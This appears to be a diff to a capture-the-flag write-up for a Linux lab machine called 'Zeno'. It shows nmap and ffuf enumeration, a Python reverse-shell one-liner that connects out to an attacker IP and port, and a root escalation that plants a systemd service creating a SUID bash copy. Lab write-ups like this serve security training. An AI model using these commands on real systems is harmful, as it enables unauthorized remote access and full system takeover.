@@ -1,5 +1,7 @@
 # Zeno
 
+#Linux 
+
 ## Reconnaissance
 
 ```
@@ -26,8 +28,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 211.64 seconds
 ```
 
+By accessing the port `12340`, I got thus following page.
+
+img1
 
 ## Enumeration
+
+Since I didn't find anything, I started enumerating directories and I found `rms` directory.
 
 ```
 $ ffuf -u http://10.65.187.29:12340/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
@@ -55,7 +62,9 @@ ________________________________________________
 rms                     [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 127ms]
 ```
 
+I got this page
 
+img2
 
 ```
 export RHOST="192.168.130.101";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
@@ -102,6 +111,7 @@ john
 stephen 1234
 
 
+## Privilege Escalation
 
 ```
 cat << EOF > /etc/systemd/system/zeno-monitoring.service
@@ -111,7 +121,7 @@ Description=Zeno monitoring
 [Service]
 Type=oneshot 
 User=root
-ExecStart=/bin/bash -c "chmod +s /bin/bash"
+ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash'
 
 [Install]
 WantedBy=multi-user.target
@@ -140,3 +150,9 @@ EOF
 ,username=zeno,password=FrobjoodAdkoonceanJa
 ```
 
+
+```
+[edward@zeno home]$ sudo /usr/sbin/reboot 
+```
+
+/home/edward/bash -p
